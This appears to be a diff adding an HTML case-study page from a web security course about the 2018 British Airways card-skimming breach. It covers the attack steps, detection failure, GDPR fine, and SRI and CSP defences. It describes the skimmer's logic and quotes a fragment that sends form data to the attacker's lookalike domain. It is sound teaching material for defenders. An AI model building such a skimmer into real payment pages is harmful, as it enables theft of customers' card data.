@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Case Study — British Airways Breach Deep Dive</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:36px 32px;max-width:860px}
+  h1{font-size:24px;font-weight:800;color:var(--accent);margin-bottom:6px}
+  .meta{font-size:12px;color:var(--muted);margin-bottom:28px}
+  h2{font-size:16px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:5px;border-bottom:1px solid var(--border)}
+  p{font-size:14px;line-height:1.7;color:var(--text);margin-bottom:12px}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--orange);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:6px;padding:16px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);overflow-x:auto;margin:12px 0;white-space:pre-wrap}
+  .callout{background:var(--panel);border-left:3px solid var(--warn);padding:12px 16px;border-radius:0 6px 6px 0;margin:16px 0;font-size:13px}
+  .callout.ok{border-color:var(--ok)}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;display:inline-block;margin-right:4px}
+  .t-supply{background:#0d1a30;color:var(--accent)}
+  .t-gdpr{background:#1a1500;color:var(--warn)}
+  nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  li{font-size:14px;line-height:1.8;margin-bottom:4px}
+</style>
+</head>
+<body>
+
+<h1>British Airways Breach — Deep Dive</h1>
+<div class="meta">
+  <span class="tag t-supply">SUPPLY CHAIN XSS</span>
+  <span class="tag t-gdpr">GDPR £20M FINE</span>
+  August 21 – September 5, 2018 &nbsp;|&nbsp; ~500,000 customers &nbsp;|&nbsp; Discovered by RiskIQ
+</div>
+
+<h2>Anatomy of the Attack</h2>
+<p>The BA breach is the cleanest example of a supply chain XSS attack and the most consequential in terms of regulatory action. It is worth studying in detail because every element of it — the injection method, the exfiltration technique, the detection failure, and the regulatory outcome — illustrates a different layer of the web security threat model.</p>
+
+<h2>Step 1: Reconnaissance</h2>
+<p>Attackers identified that <code>ba.com/booking</code> (the payment page) loaded a JavaScript file from a CDN. The specific file was a Modernizr-adjacent utility script — not the core application code. Utility scripts are commonly overlooked in security audits because they are perceived as low-risk (no application logic).</p>
+<p>Attackers also registered <code>baways.com</code> approximately two weeks before the attack — a lookalike domain for exfiltration.</p>
+
+<h2>Step 2: CDN Compromise</h2>
+<p>The exact method of CDN compromise has not been publicly confirmed. Possible vectors include: compromised CDN provider credentials, man-in-the-middle on a CDN update mechanism, or a separate vulnerability in the CDN infrastructure. The end result was that the attackers gained write access to the JS file served to ba.com.</p>
+
+<h2>Step 3: Skimmer Injection</h2>
+<p>22 lines were appended to the legitimate utility script. The additions were designed to blend in with the surrounding code style. The skimmer:</p>
+<ol style="padding-left:20px">
+  <li>Waited for <code>DOMContentLoaded</code></li>
+  <li>Located the payment form using a stable selector (<code>[name="paymentForm"]</code>)</li>
+  <li>Registered a <code>submit</code> event listener</li>
+  <li>On submit: read all payment fields (name, card number, expiry, CVV, email)</li>
+  <li>Exfiltrated via <code>new Image().src</code> to <code>https://baways.com/gateway/v1/cdn?[data]</code></li>
+  <li>Did not cancel the form submission — the legitimate transaction proceeded</li>
+</ol>
+
+<h2>Step 4: 15 Days Undetected</h2>
+<p>The skimmer ran from August 21 to September 5 — 15 days. It was discovered by RiskIQ's researchers through routine monitoring of JS file changes on high-value e-commerce sites, not by BA's own security team.</p>
+
+<div class="callout">
+<strong>Why 15 days?</strong> BA had no automated monitoring of the integrity of their deployed JS files. The modified file had the same URL and was served from the same CDN — it appeared identical to normal traffic. No CSP violation reports were generated (BA had no CSP). No anomalous outbound traffic alerts were triggered. The only detection signal was the content of the JS file itself — which was only examined externally.
+</div>
+
+<h2>Step 5: Discovery and Response</h2>
+<p>RiskIQ identified the compromise by diffing BA's JS files against their archived versions. They notified BA on September 5, 2018. BA took the payment flow offline, removed the compromised file, and notified the ICO within 72 hours (as required by GDPR Article 33).</p>
+
+<h2>GDPR Outcome</h2>
+<p>The ICO issued an intention to fine BA £183.39 million (approximately 1.5% of global annual turnover) — the largest GDPR fine at the time. After representations from BA (including COVID-19 impact on revenue and BA's cooperation with the investigation), the fine was reduced to £20 million.</p>
+<p>The ICO's findings relevant to security practitioners:</p>
+<ul style="padding-left:20px">
+  <li>BA had failed to implement appropriate technical measures to protect personal data (GDPR Article 25, 32)</li>
+  <li>Specifically cited: absence of SRI on third-party scripts, absence of CSP, absence of continuous integrity monitoring</li>
+  <li>The breach was preventable with standard controls that were available and known at the time</li>
+</ul>
+
+<h2>Technical Post-Mortem: What Would Have Stopped It</h2>
+
+<p><strong>Subresource Integrity (would have prevented execution):</strong></p>
+<pre>&lt;script
+  src="https://cdn.ba.com/modernizr-custom.js"
+  integrity="sha256-[hash]"
+  crossorigin="anonymous"&gt;&lt;/script&gt;
+
+&lt;!-- Browser verifies file hash before executing.
+     Modified file → hash mismatch → execution blocked. --&gt;</pre>
+
+<p><strong>CSP img-src (would have blocked exfiltration):</strong></p>
+<pre>Content-Security-Policy: img-src 'self' https://static.ba.com;</pre>
+<p>The <code>new Image().src = 'https://baways.com/...'</code> call would generate a CSP violation and the request would be blocked.</p>
+
+<p><strong>CSP report-uri (would have detected anomaly):</strong></p>
+<pre>Content-Security-Policy-Report-Only:
+  default-src 'self';
+  report-uri https://csp.ba.com/report;</pre>
+<p>Even in report-only mode, a violation when the skimmer tried to load an image from <code>baways.com</code> would have generated a report — providing a detection signal within minutes of the first skimmer execution.</p>
+
+<div class="callout ok">
+<strong>Key takeaway for defenders:</strong> Report-only CSP mode is free, requires no testing, and cannot break your application. It provides detection for XSS and supply chain injection with zero risk. Any organisation processing payment card data should have CSP report-uri as a minimum baseline — well before enforcing CSP.
+</div>
+
+<h2>PhD-Level Observations</h2>
+<ol style="padding-left:20px">
+  <li>Supply chain XSS attacks scale in a way that direct XSS does not. A single CDN compromise reaches every customer of every site using that CDN. The attack surface is not the target site's code — it's the entire dependency graph.</li>
+  <li>SRI is the technically complete defence against supply chain JS injection. However, SRI adoption on the web remains low — a 2020 study found SRI used on fewer than 10% of script tags that include external resources.</li>
+  <li>The 15-day detection gap highlights a monitoring gap in the industry: static asset integrity monitoring. Log-based and network-based monitoring catch runtime anomalies; file integrity monitoring catches static asset changes. These are different monitoring planes and both are needed.</li>
+  <li>GDPR's "appropriate technical measures" standard is retrospective: it asks whether the measures were known and available at the time, not whether they were commonly deployed. SRI was standardised in 2016 and was known and available in 2018. This creates legal liability for organisations that knowingly skip standard security controls.</li>
+</ol>
+
+<nav>
+  <a href="magecart.html">← Magecart Overview</a>
+  <a href="../tutorial.html">← Module 16 Tutorial</a>
+</nav>
+
+</body>
+</html>
